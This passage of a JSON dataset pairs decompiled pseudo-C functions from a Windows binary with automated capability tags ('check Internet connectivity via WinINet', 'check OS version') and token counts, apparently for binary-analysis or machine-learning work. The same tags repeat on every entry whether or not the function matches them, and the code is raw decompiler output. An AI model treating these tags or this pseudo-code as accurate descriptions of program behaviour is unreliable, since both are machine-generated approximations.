            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00023810(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c59554 == -1) {\n        iVar1 = fcn.00020a60(arg_8h, arg_ch, 0xb1c59554);\n        if (iVar1 == 0) {\n            *0xb1c5b358 = *(*0xb1c59554 * 4 + -0x4e3978b8) + 8;\n            *0xb1c5b35c = *(*(*0xb1c59554 * 4 + -0x4e3978b8) + 0x34);\n        }\n        else {\n            *0xb1c59554 = -1;\n        }\n    }\n    else {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 202
    },
    "00023880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00023880(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0xb1c59554 == -1) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = fcn.00021240(*0xb1c59554, 0);\n        *0xb1c59554 = -1;\n    }\n    fcn.00034550(0xb1c68740);\n    for (var_8h = 0; (var_8h < 10 && (*(var_8h * 4 + -0x4e3978b8) == 0)); var_8h = var_8h + 1) {\n    }\n    fcn.000345c0(0xb1c68740);\n    if (9 < var_8h) {\n        fcn.00034520(0xb1c68740);\n        *0xb1c68744 = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 231
    },
    "00023940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00023940(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch < 10) {\n        while( true ) {\n            fcn.00034550(0xb1c68740);\n            arg_8h_00 = *(arg_ch * 4 + -0x4e3978b8);\n            if (arg_8h_00 == 0) break;\n            iVar1 = fcn.000347f0(arg_8h_00 + 0x5c);\n            if (iVar1 != 0) {\n                if (arg_10h != 2) {\n                    fcn.000345c0(0xb1c68740);\n                }\n                *arg_14h = arg_8h_00 + 0x5c;\n                arg_14h[1] = arg_10h == 2;\n                if (arg_10h != 2) {\n                    iVar1 = *(arg_8h_00 + 0x2c);\n                    iVar2 = (**(*(arg_8h_00 + 0x44) + 0x14))(*(arg_8h_00 + 0x48), arg_8h_00 + 8, 0x2c, 0);\n                    if (iVar2 != 0) {\n                        fcn.00023a70(arg_14h);\n                        return 3;\n                    }\n                    if ((*(arg_8h_00 + 0x2c) != iVar1) && (iVar1 = fcn.00023ae0(arg_8h_00),  iVar1 != 0)) {\n                        fcn.00023a70(arg_14h);\n                        return iVar1;\n                    }\n                }\n                if (arg_8h != NULL) {\n                    *arg_8h = arg_8h_00;\n                }\n                return 0;\n            }\n            fcn.000345c0(0xb1c68740);\n            fcn.000209a0(10);\n        }\n        fcn.000345c0(0xb1c68740);\n    }\n    return 1;\n}\n",
        "token_count": 549
    },
    "00023a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023a70(uint *arg_8h)\n\n{\n    fcn.000347d0(*arg_8h);\n    if (arg_8h[1] != 0) {\n        fcn.000345c0(0xb1c68740);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00023ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n\nint32_t __cdecl fcn.00023ae0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t *var_54h;\n    uint32_t var_50h;\n    int32_t *var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_1ch;\n    int32_t var_4h;\n    \n    var_50h = 0x2c;\n    var_4h = 0;\n    (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 2, 0);\n    var_4ch = *(arg_8h + 0x38);\n    while (var_4ch != NULL) {\n        var_54h = var_4ch[7];\n        var_4h = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_48h, 0x40, var_50h);\n        if (var_4h != 0) break;\n        var_4ch[3] = var_50h;\n        if (((*var_4ch == var_44h) && (var_4ch[1] == var_1ch)) && (var_4ch[2] == var_3ch)) {\n            if ((*var_4ch[8] != var_48h) || (*(var_4ch[8] + 4) != var_40h)) {\n                if ((var_40h == 0xffff) && (var_48h == *var_4ch[8])) {\n                    fcn.00023110(arg_8h, var_4ch[8], *var_4ch);\n                }\n                else {\n                    if (var_48h != *var_4ch[8]) {\n                        var_4h = -1;\n                        break;\n                    }\n                    fcn.00023110(arg_8h, var_4ch[8], var_44h);\n                    var_4h = fcn.00022da0(arg_8h, var_48h, var_40h, var_44h, var_3ch, var_50h, var_1ch);\n                    if (var_4h != 0) break;\n                    uVar1 = fcn.00022f10(*(arg_8h + 0x34), var_48h, var_40h);\n                    fcn.000232d0(uVar1);\n                }\n            }\n        }\n        else {\n            if (var_40h != 0xffff) {\n                var_4h = -1;\n                break;\n            }\n            var_54h = var_4ch;\n        }\n        var_50h = var_50h + 0x40 + var_1ch;\n        var_4ch = var_54h;\n    }\n    if (var_4h != 0) {\ncode_r0x00023d25:\n        if (var_4h != 0) {\n            var_4h = fcn.000228a0(arg_8h);\n        }\n        (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 1);\n        return var_4h;\n    }\n    do {\n        if ((*(arg_8h + 0x1c) <= var_50h) ||\n           (var_4h = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_48h, 0x40, var_50h),  var_4h != 0))\n        goto code_r0x00023d25;\n        if (var_40h != 0xffff) {\n            var_4h = fcn.00022da0(arg_8h, var_48h, var_40h, var_44h, var_3ch, var_50h, var_1ch);\n            if (var_4h != 0) goto code_r0x00023d25;\n            uVar1 = fcn.00022f10(*(arg_8h + 0x34), var_48h, var_40h);\n            fcn.000232d0(uVar1);\n        }\n        var_50h = var_50h + 0x40 + var_1ch;\n    } while( true );\n}\n",
        "token_count": 1102
    },
    "00023d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023d60(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    if ((*(arg_8h + 0x60) != 0) && (*arg_ch == *(arg_8h + 100))) {\n        *arg_ch = *(arg_8h + 0x68);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00023d90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00023d90(uint *arg_8h, uint arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint32_t var_980h;\n    uint var_97ch;\n    int32_t var_978h;\n    int32_t var_974h;\n    uint var_970h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_158h;\n    int32_t var_128h;\n    uint var_124h;\n    int32_t var_114h;\n    uint var_110h;\n    uint var_dh;\n    uchar *var_4h;\n    \n    bVar1 = false;\n    var_974h = 0;\n    var_128h = 0;\n    if (*0xb1c5b360 != 0) {\n        return 0x21590064;\n    }\n    *0xb1c685fc = 0;\n    fcn.00078652(0xb1c68620, arg_8h, 0x104);\n    *0xb1c68604 = arg_ch;\n    fcn.00078652(&var_110h, arg_8h, 0x104);\n    var_dh._0_1_ = 0;\n    var_4h = fcn.00078658(&var_110h, 0x23);\n    if (var_4h == NULL) {\n        var_978h = -1;\n    }\n    else {\n        *var_4h = 0;\n        var_4h = var_4h + 1;\n        var_978h = fcn.00035eb0(var_4h, 0, 0);\n        arg_8h = &var_110h;\n    }\n    fcn.00024bf0(arg_8h, 0xb1bdea64, 1);\n    var_114h = fcn.00023810(arg_8h, 1);\n    if (var_114h == 0) {\n        if (var_978h == -1) {\n            var_114h = 0;\n        }\n        else {\n            var_114h = fcn.000235a0(0xfffffffe, 0xb, &var_978h, &var_168h);\n            if (var_114h == 0) {\n                fcn.00023910(0xfffffffe, var_158h);\n            }\n            else {\n                fcn.00023880();\n                if (var_978h != 1) {\n                    var_980h = var_114h + 0x191U | 0x21590000;\n                    goto code_r0x000240af;\n                }\n            }\n        }\n        if ((var_114h == 0) && (var_114h = fcn.00029510(&var_124h, 0x10, 0x229),  var_114h != 0)) {\n            fcn.00023880();\n        }\n    }\n    if (var_114h == 0) {\n        var_980h = 0;\n    }\n    else {\n        var_980h = var_114h + 0x191U | 0x21590000;\n        iVar2 = fcn.00024bf0(arg_8h, 0xb1bdea6c, 0);\n        if ((iVar2 != 0) || (iVar2 = fcn.00023810(arg_8h, 0),  iVar2 != 0)) goto code_r0x000240af;\n        if (var_978h != -1) {\n            iVar2 = fcn.000235a0(0xfffffffe, 0xb, &var_978h, &var_168h);\n            if (iVar2 != 0) {\n                fcn.00023880();\n                goto code_r0x000240af;\n            }\n            fcn.00023910(0xfffffffe, var_158h);\n        }\n        iVar2 = fcn.00029510(&var_124h, 0x10, 0x229);\n        if (iVar2 != 0) {\n            fcn.00023880();\n            goto code_r0x000240af;\n        }\n    }\n    var_974h = 1;\n    fcn.00029970(8, 0, var_980h, 0, 0);\n    fcn.00029090(5, 0xb1c5a935, 0x20, &var_16ch);\n    fcn.0002c030();\n    fcn.000249f0(&var_970h, 0x800);\n    uVar3 = 0;\n    arg_8h_00 = &var_970h;\n    var_980h = fcn.00075560(arg_8h_00);\n    if (var_980h == 0) {\n        bVar1 = true;\n        var_980h = fcn.00066c80(arg_8h_00, uVar3);\n        if (var_980h == 0) {\n            var_128h = 1;\n            var_980h = fcn.00024130(arg_ch);\n            if (var_980h == 0) {\n                var_980h = 0;\n                *0xb1c5b360 = 1;\n            }\n        }\n    }\ncode_r0x000240af:\n    if (var_974h != 0) {\n        fcn.00029970(9, 0, var_980h, 0, 0);\n    }\n    if (var_980h != 0) {\n        if (var_128h != 0) {\n            fcn.000245b0();\n            fcn.0002d0b0();\n            fcn.00026ce0();\n            fcn.0002aa80();\n            fcn.0006d500();\n        }\n        if (bVar1) {\n            fcn.00075750();\n        }\n        if (var_974h != 0) {\n            fcn.0002c440(0xfffffffe);\n            fcn.0002c050();\n            fcn.00023880();\n        }\n    }\n    return var_980h;\n}\n",
        "token_count": 1406
    },
    "00024130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00024130(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_4h;\n    \n    fcn.00026c80();\n    fcn.0002a940();\n    fcn.0002d080();\n    fcn.000244e0();\n    fcn.00025e50();\n    var_70h._0_1_ = '\\0';\n    fcn.00029090(0x22b, &var_70h, 100, &var_4h);\n    if (var_70h != '\\0') {\n        arg_8h = 0;\n    }\n    *0xb1c68728 = arg_8h;\n    if (arg_8h == 0) {\n        iVar1 = fcn.00033ff0(0xb1c68608);\n        if ((iVar1 == 0) || (iVar1 = fcn.00033ff0(0xb1c685f4),  iVar1 == 0)) {\n            var_74h = fcn.00035620();\n            goto code_r0x00024277;\n        }\n        uVar4 = 0;\n        uVar3 = 0;\n        uVar2 = 0xb1bf22e0;\n        iVar1 = fcn.0001a8e0(0xb1c59d94, 0xb1bf22e0, 0);\n        if (iVar1 != 0) {\n            var_74h = fcn.00035620();\n            goto code_r0x00024277;\n        }\n        iVar1 = fcn.00029470(300, 0);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00033ff0(0xb1c685f8);\n            if ((iVar1 == 0) || (iVar1 = fcn.00033ff0(0xb1c68724),  iVar1 == 0)) {\n                var_74h = fcn.00035620(uVar2, uVar3, uVar4);\n                goto code_r0x00024277;\n            }\n            iVar1 = fcn.0001a8e0(0xb1c59dc4, 0xb1bf23e0, 0);\n            if (iVar1 != 0) {\n                var_74h = fcn.00035620();\n                goto code_r0x00024277;\n            }\n        }\n    }\n    else {\n        iVar1 = fcn.00033ff0(0xb1c68600);\n        if (iVar1 == 0) {\n            var_74h = fcn.00035620();\n            goto code_r0x00024277;\n        }\n        iVar1 = fcn.0001a8e0(0xb1c59dcc, 0xb1bf24e0, 0);\n        if (iVar1 != 0) {\n            var_74h = fcn.00035620();\n            goto code_r0x00024277;\n        }\n    }\n    var_74h = 0;\ncode_r0x00024277:\n    if (var_74h != 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.00037240(0xb1c685f4);\n            if (iVar1 != 0) {\n                fcn.00034080(0xb1c685f4);\n            }\n            iVar1 = fcn.00037240(0xb1c68724);\n            if (iVar1 != 0) {\n                fcn.00034080(0xb1c68724);\n            }\n            iVar1 = fcn.00037240(0xb1c59d94);\n            if (iVar1 != 0) {\n                fcn.000372c0(0xb1c59d94);\n                fcn.00037220(0xb1c59d94);\n            }\n            iVar1 = fcn.00037240(0xb1c59dc4);\n            if (iVar1 != 0) {\n                fcn.000372c0(0xb1c59dc4);\n                fcn.00037220(0xb1c59dc4);\n            }\n            iVar1 = fcn.00037240(0xb1c68608);\n            if (iVar1 != 0) {\n                fcn.00034080(0xb1c68608);\n            }\n            iVar1 = fcn.00037240(0xb1c685f8);\n            if (iVar1 != 0) {\n                fcn.00034080(0xb1c685f8);\n            }\n        }\n        else {\n            iVar1 = fcn.00037240(0xb1c68600);\n            if (iVar1 != 0) {\n                fcn.00034080(0xb1c68600);\n            }\n            iVar1 = fcn.00037240(0xb1c59dcc);\n            if (iVar1 != 0) {\n                fcn.000372c0(0xb1c59dcc);\n                fcn.00037220(0xb1c59dcc);\n            }\n        }\n    }\n    return var_74h;\n}\n",
        "token_count": 1192
    },
    "00024380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00024380(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0xb1c5b360 != 0) {\n        fcn.00029970(10, 0, 0, 0, 0);\n        *0xb1c685fc = 1;\n        iVar1 = fcn.00037240(0xb1c68608);\n        if (iVar1 != 0) {\n            fcn.000340b0(0xb1c68608);\n            if (*0xb1c685f0 != 0) {\n                fcn.00077140(0xb1c685f0, 0);\n            }\n            fcn.000340e0(0xb1c685f4, 0xffffffff);\n            fcn.00037220(0xb1c59d94);\n            fcn.00034080(0xb1c68608);\n            fcn.00034080(0xb1c685f4);\n        }\n        iVar1 = fcn.00037240(0xb1c685f8);\n        if (iVar1 != 0) {\n            fcn.000340b0(0xb1c685f8);\n            fcn.000340e0(0xb1c68724, 0xffffffff);\n            fcn.00037220(0xb1c59dc4);\n            fcn.00034080(0xb1c685f8);\n            fcn.00034080(0xb1c68724);\n        }\n        iVar1 = fcn.00037240(*0xb1c68728);\n        if ((iVar1 != 0) && (iVar1 = fcn.00037240(0xb1c68600),  iVar1 != 0)) {\n            fcn.000340b0(*0xb1c68728);\n            fcn.000340e0(0xb1c68600, 0xffffffff);\n            fcn.00037220(0xb1c59dcc);\n            fcn.00034080(0xb1c68600);\n        }\n        fcn.000245b0();\n        fcn.0002d0b0();\n        fcn.0002aa80();\n        fcn.00026ce0();\n        fcn.0006d500();\n        fcn.00075750();\n        fcn.0002c440(0xfffffffe);\n        fcn.0002c050();\n        fcn.00029970(0xb, 0, 0, 0, 0);\n        fcn.00023880();\n        *0xb1c5b360 = 0;\n    }\n    return;\n}\n",
        "token_count": 582
    },
    "000244e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.000244e0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_214h;\n    uint var_210h;\n    uint var_110h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.00029470(100, 0);\n    var_ch = 0;\n    for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n        iVar1 = fcn.00029090(var_8h + 0x65, &var_210h, 0x100, &var_214h);\n        if (iVar1 == 0) {\n            var_110h._0_1_ = 0;\n            fcn.00029090(var_8h + 0x70, &var_110h, 0x100, &var_214h);\n            uVar2 = fcn.00024600(&var_210h, &var_110h);\n            *(var_ch * 4 + -0x4e3a6264) = uVar2;\n            if (*(var_ch * 4 + -0x4e3a6264) != 0) {\n                var_ch = var_ch + 1;\n            }\n        }\n    }\n    fcn.00049960();\n    fcn.00037c60();\n    return;\n}\n",
        "token_count": 344
    },
    "000245b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.000245b0(uint param_1)\n\n{\n    uint32_t var_4h;\n    \n    fcn.0006d500(param_1);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        if (*(var_4h * 4 + -0x4e3a6264) != 0) {\n            fcn.00077140(var_4h * 4 + -0x4e3a6264, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00024600": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00024600(uint arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    char *arg_ch_00;\n    uint var_5ch;\n    char *var_58h;\n    char *var_54h;\n    uint var_50h;\n    uint var_48h;\n    char *var_44h;\n    uint var_40h;\n    uint var_38h;\n    char *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    char *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00035360(arg_8h);\n    if (var_ch == 0) {\n        var_14h = 0;\n    }\n    else {\n        puVar2 = fcn.000785ce(var_ch, 0x2f);\n        if (puVar2 == NULL) {\n            var_18h = puVar2;\n            fcn.00035330(var_ch);\n            var_14h = 0;\n        }\n        else {\n            *puVar2 = 0;\n            var_18h = puVar2 + 1;\n            var_8h = var_ch;\n            var_4h = 0;\n            var_34h = var_18h;\n            do {\n                cVar1 = *var_34h;\n                var_34h = var_34h + 1;\n            } while (cVar1 != '\\0');\n            var_10h = fcn.00076d00(&var_14h, &var_8h, var_18h, var_34h + (1 - (puVar2 + 2)), 1);\n            fcn.00035330(var_ch);\n            if (var_10h == 0) {\n                if (arg_ch != NULL) {\n                    var_44h = arg_ch;\n                    do {\n                        cVar1 = *var_44h;\n                        var_44h = var_44h + 1;\n                    } while (cVar1 != '\\0');\n                    arg_ch_00 = fcn.00035200(var_44h + (2 - (arg_ch + 1)));\n                    if (arg_ch_00 == NULL) {\n                        fcn.00077140(&var_14h, 0);\n                        return 0;\n                    }\n                    var_54h = arg_ch;\n                    var_58h = arg_ch_00;\n                    do {\n                        cVar1 = *var_54h;\n                        *var_58h = cVar1;\n                        var_54h = var_54h + 1;\n                        var_58h = var_58h + 1;\n                    } while (cVar1 != '\\0');\n                    arg_ch_00[var_44h + (2 - (arg_ch + 1)) + -1] = '\\0';\n                    for (var_28h = arg_ch_00; *var_28h != '\\0'; var_28h = var_28h + 1) {\n                        if (*var_28h == ',') {\n                            *var_28h = '\\0';\n                        }\n                    }\n                    var_10h = fcn.00077250(var_14h, arg_ch_00, 0);\n                    if (var_10h != 0) {\n                        fcn.00029970(8, 0, var_10h, 0, 0);\n                        fcn.00035330(arg_ch_00);\n                        fcn.00077140(&var_14h, 0);\n                        return 0;\n                    }\n                    fcn.00035330(arg_ch_00);\n                }\n                var_20h = 0;\n                var_1ch = 0;\n                var_24h = 0xb1bf1990;\n                fcn.00077310(var_14h, 2, &var_24h, 0xc, 0);\n                fcn.00077310(var_14h, 5, 0xb1bf19b0, 0, 0);\n                var_10h = fcn.00077430(var_14h, 0xb1bf1880, 0, 0);\n                if (var_10h != 0) {\n                    fcn.00029970(8, 0, var_10h, 0, 0);\n                    fcn.00077140(&var_14h, 0);\n                    var_14h = 0;\n                }\n            }\n            else {\n                fcn.00029970(8, 0, var_10h, 0, 0);\n                var_14h = 0;\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 1102
    },
    "00024880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00024880(uint arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *arg_ch_00;\n    uint var_11ch;\n    uint var_118h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h < 0x15) {\n        uVar1 = 0x21590064;\n    }\n    else {\n        var_18h = *arg_10h;\n        var_14h = arg_10h[1];\n        var_10h = arg_10h[2];\n        var_ch = arg_10h[3];\n        var_8h = arg_10h[4];\n        var_4h._0_1_ = *(arg_10h + 5);\n        fcn.00026b30(&var_18h);\n        if ((var_14h & 0x80000000) == 0) {\n            if ((var_10h == '\\x02') && (arg_ch_00 = fcn.00077b10(arg_8h, 4, 0),  arg_ch_00 != NULL)) {\n                *arg_ch_00 = var_14h;\n                fcn.00077c80(arg_8h, arg_ch_00);\n            }\n        }\n        else {\n            iVar2 = fcn.00029470(3, 0);\n            if ((iVar2 != 0) && (iVar2 = fcn.00077c20(arg_8h, 4, &var_118h, 0x100, 0),  iVar2 == 0)) {\n                fcn.0002a070(var_14h & 0x7fffffff, &var_118h);\n            }\n        }\n        uVar1 = fcn.00026da0(arg_8h, arg_ch, arg_10h + 0x15, arg_14h - 0x15, arg_18h, arg_1ch, &var_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 529
    },
    "000249b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000249b0(uint noname_0, uint32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t arg_8h;\n    uint var_4h;\n    \n    if (((arg_ch != NULL) && (arg_8h = *arg_ch,  arg_8h != 0)) && ((arg_8h & 0x80000000) == 0)) {\n        fcn.000274e0(arg_8h, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "000249f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000249f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_14ch;\n    uint var_144h;\n    uint *var_140h;\n    uint var_138h;\n    char *var_134h;\n    uint *var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint *var_120h;\n    char *var_11ch;\n    uint var_118h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_11ch = NULL;\n    var_8h = 0;\n    do {\n        if (9 < var_8h) {\ncode_r0x00024bdd:\n            var_11ch[arg_8h] = '\\0';\n            return;\n        }\n        iVar2 = fcn.00029090(var_8h + 0x191, &var_118h, 0x104, &var_4h);\n        if (iVar2 == 0) {\n            if (var_118h == '&') {\n                var_ch = fcn.00035eb0(&var_118h + 1, 0, 0);\n                if ((var_ch == 0) || (iVar2 = fcn.0002c070(var_ch, 0xfffffffe, 1, 0, &var_118h),  iVar2 != 0))\n                goto code_r0x00024a0c;\n            }\n            else {\n                var_ch = 0;\n            }\n            var_120h = &var_118h;\n            do {\n                cVar1 = *var_120h;\n                var_120h = var_120h + 1;\n            } while (cVar1 != '\\0');\n            if ((arg_ch - var_11ch) + -1 <= var_120h + (1 - (&var_118h + 1))) {\n                if (var_ch != 0) {\n                    fcn.0002c370(var_ch);\n                }\n                goto code_r0x00024bdd;\n            }\n            var_130h = &var_118h;\n            var_134h = var_11ch + arg_8h;\n            do {\n                cVar1 = *var_130h;\n                *var_134h = cVar1;\n                var_130h = var_130h + 1;\n                var_134h = var_134h + 1;\n            } while (cVar1 != '\\0');\n            var_140h = &var_118h;\n            do {\n                cVar1 = *var_140h;\n                var_140h = var_140h + 1;\n            } while (cVar1 != '\\0');\n            var_11ch = var_140h + var_11ch + (1 - (&var_118h + 1));\n        }\ncode_r0x00024a0c:\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 684
    },
    "00024bf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00024bf0(char *arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_2d0h;\n    char *var_2cch;\n    char *var_2c8h;\n    uint *var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b0h;\n    char *var_2ach;\n    uint var_2a4h;\n    uint *var_2a0h;\n    char *var_29ch;\n    uint var_294h;\n    char *var_290h;\n    uint *var_28ch;\n    uint *var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_274h;\n    uint *var_270h;\n    uint var_268h;\n    uint *var_264h;\n    char *var_260h;\n    uint var_25ch;\n    uint var_254h;\n    uint *var_250h;\n    uint var_24ch;\n    uint var_244h;\n    char *var_240h;\n    uint var_23ch;\n    int32_t var_228h;\n    uchar uStack541;\n    uint var_218h;\n    uchar uStack277;\n    uint var_110h;\n    char *var_4h;\n    \n    var_240h = arg_8h;\n    do {\n        cVar2 = *var_240h;\n        var_240h = var_240h + 1;\n    } while (cVar2 != '\\0');\n    var_250h = arg_ch;\n    do {\n        cVar2 = *var_250h;\n        var_250h = var_250h + 1;\n    } while (cVar2 != '\\0');\n    if (var_240h + var_250h + (-(arg_ch + 1) - (arg_8h + 1)) < 0x105) {\n        var_260h = arg_8h;\n        var_264h = &var_218h;\n        do {\n            cVar2 = *var_260h;\n            *var_264h = cVar2;\n            var_260h = var_260h + 1;\n            var_264h = var_264h + 1;\n        } while (cVar2 != '\\0');\n        var_4h = fcn.000251b0(&var_218h);\n        if (var_4h == NULL) {\n            var_270h = 